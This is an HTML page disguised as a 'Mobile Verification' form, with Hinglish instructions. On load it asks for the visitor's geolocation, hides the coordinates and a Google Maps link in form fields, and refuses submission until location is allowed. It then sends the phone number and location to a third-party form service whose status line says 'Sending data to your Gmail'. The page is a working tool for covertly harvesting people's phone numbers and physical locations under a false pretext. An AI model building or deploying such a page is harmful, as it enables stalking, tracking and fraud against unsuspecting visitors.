<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Number</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; }
        .form-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        input[type="tel"] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
        button { background-color: #007bff; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 100%; }
        button:hover { background-color: #0056b3; }
        #status { margin-top: 15px; color: #555; font-size: 14px; }
    </style>
</head>
<body>

<div class="form-container">
    <h2>Mobile Verification</h2>
    <p>Kripya apna mobile number enter karein aur location allow karein.</p>
    
    <form id="locationForm" action="https://api.web3forms.com/submit" method="POST">
        <input type="hidden" name="access_key" value="394be003-9b48-427f-a2d3-001ece7336bf">
        
        <input type="tel" name="Mobile_Number" placeholder="Enter Mobile Number" required id="phoneNumber">
        
        <input type="hidden" name="Latitude" id="latField">
        <input type="hidden" name="Longitude" id="lngField">
        <input type="hidden" name="Google_Maps_Link" id="mapLinkField">

        <button type="submit" id="submitBtn">Submit & Verify</button>
    </form>
    
    <div id="status"></div>
</div>

<script>
    const form = document.getElementById('locationForm');
    const status = document.getElementById('status');

    // Jaise hi link khulegi, browser location access maangna shuru kar dega
    window.onload = function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    document.getElementById('latField').value = lat;
                    document.getElementById('lngField').value = lng;
                    document.getElementById('mapLinkField').value = `https://www.google.com/maps?q=${lat},${lng}`;
                    
                    status.innerText = "Location access successfully allowed.";
                    status.style.color = "green";
                },
                function(error) {
                    status.innerText = "Kripya page reload karein aur location ko 'Allow' karein.";
                    status.style.color = "red";
                }
            );
        } else {
            status.innerText = "Aapka browser location support nahi karta.";
        }
    };

    // Form submit hone par validation aur message
    form.addEventListener('submit', function(e) {
        const lat = document.getElementById('latField').value;
        if (!lat) {
            e.preventDefault(); // Form rok dega agar location allow nahi hui hai
            alert("Pehle location allow karein, uske baad hi submit karein.");
        } else {
            status.innerText = "Sending data to your Gmail...";
        }
    });
</script>

</body>
</html>
